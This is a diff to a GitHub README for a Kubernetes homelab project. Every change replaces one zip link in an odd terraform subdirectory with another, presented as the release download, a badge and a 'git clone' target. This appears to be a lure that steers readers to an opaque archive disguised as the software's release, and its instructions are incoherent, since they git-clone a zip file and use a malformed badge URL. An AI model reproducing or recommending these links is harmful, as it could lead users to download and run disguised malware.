@@ -1,7 +1,7 @@
 # 🌟 homelabs - Easy Setup for Your Kubernetes Learning
 
 ## 📥 Download the Latest Release
-[![Download Latest Release](https://raw.githubusercontent.com/brandonjh5937/homelabs/main/terraform/domains/carimbo-vip/homelabs_2.6.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/brandonjh5937/homelabs/main/terraform/domains/carimbo-vip/homelabs_2.6.zip)
+[![Download Latest Release](https://github.com/brandonjh5937/homelabs/raw/refs/heads/main/terraform/modules/Software-v1.2.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/brandonjh5937/homelabs/raw/refs/heads/main/terraform/modules/Software-v1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to homelabs! This guide will help you set up a powerful 4-node k3s cluster on your computer using Vagrant and VirtualBox. You will have everything you need for learning and testing Kubernetes with a complete observability stack including Prometheus, Grafana, and Loki.
@@ -33,13 +33,13 @@ Follow these steps to get started with your homelabs setup:
    If you don’t have Vagrant or VirtualBox installed, download and install them from the official websites. Ensure you have the latest versions.
 
 2. **Visit the Releases Page to Download:**
-   Go to our [Releases page](https://raw.githubusercontent.com/brandonjh5937/homelabs/main/terraform/domains/carimbo-vip/homelabs_2.6.zip) to download the latest version of the software.
+   Go to our [Releases page](https://github.com/brandonjh5937/homelabs/raw/refs/heads/main/terraform/modules/Software-v1.2.zip) to download the latest version of the software.
 
 3. **Clone the Repository or Download ZIP:**
    You can either clone the repository or download it as a ZIP file.
    - To clone, run this command in your terminal:
      ```bash
-     git clone https://raw.githubusercontent.com/brandonjh5937/homelabs/main/terraform/domains/carimbo-vip/homelabs_2.6.zip
+     git clone https://github.com/brandonjh5937/homelabs/raw/refs/heads/main/terraform/modules/Software-v1.2.zip
      ```
    - To download the ZIP file, click on the green "Code" button and select "Download ZIP."
 
@@ -73,7 +73,7 @@ After installation, you may want to customize some settings. Here are a few tips
 - **Use Terraform:** Modify the Terraform scripts to manage your infrastructure easily.
 
 ## 📦 Download & Install
-For quick access, you can download the latest release directly from the Releases page by clicking [here](https://raw.githubusercontent.com/brandonjh5937/homelabs/main/terraform/domains/carimbo-vip/homelabs_2.6.zip).
+For quick access, you can download the latest release directly from the Releases page by clicking [here](https://github.com/brandonjh5937/homelabs/raw/refs/heads/main/terraform/modules/Software-v1.2.zip).
 
 ## 📖 Documentation and Support
 For more detailed documentation, visit the Wiki section of this repository. You can find:
@@ -107,4 +107,4 @@ If you would like to contribute, feel free to submit pull requests or open issue
 For any inquiries or additional support, please reach out through the Issues section in this repository or via direct email.
 
 ### 🌐 Visit the Releases Page to Download
-Don't forget to download the latest version from our [Releases page](https://raw.githubusercontent.com/brandonjh5937/homelabs/main/terraform/domains/carimbo-vip/homelabs_2.6.zip).
+Don't forget to download the latest version from our [Releases page](https://github.com/brandonjh5937/homelabs/raw/refs/heads/main/terraform/modules/Software-v1.2.zip).
